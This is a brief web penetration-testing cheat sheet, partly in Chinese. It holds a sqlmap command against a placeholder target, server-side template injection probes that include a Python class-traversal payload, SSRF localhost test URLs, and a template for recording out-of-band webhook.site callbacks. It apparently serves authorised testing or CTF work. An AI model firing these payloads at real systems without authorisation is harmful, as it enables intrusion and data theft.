# Web Templates (精简版)

## SQL 注入
```bash
python ~/tools/sqlmap/sqlmap.py -u "http://target/?id=1" --dbs
```

## SSTI
```
{{7*7}}
{{config}}
{{request}}
{{''.__class__.__mro__[2].__subclasses__()}}
```

## SSRF
```
http://127.0.0.1
http://localhost
http://[::1]
```

## OAST/外带证据（webhook.site）
```text
Payload:
Target URL / Parameter:
Callback URL:
Request ID:
Webhook hit time (UTC):
Webhook request headers:
Webhook request body (truncated):
Notes:
```

## 基本请求
```python
import requests
r = requests.get('http://target')
r = requests.post('http://target', data={'key': 'value'})
```
